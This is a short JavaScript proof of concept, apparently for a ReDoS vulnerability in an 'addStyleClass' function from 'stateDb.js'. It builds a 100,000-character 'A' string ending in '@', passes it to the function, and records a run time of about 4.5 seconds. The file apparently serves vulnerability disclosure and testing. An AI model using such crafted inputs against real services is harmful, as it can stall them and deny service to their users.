import { addStyleClass } from "./stateDb.js";

//Attack String :""+"A"*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "A";
}
str += "@";

var result = addStyleClass("a", str);

// real    0m4.505s
// user    0m4.487s
// sys     0m0.000s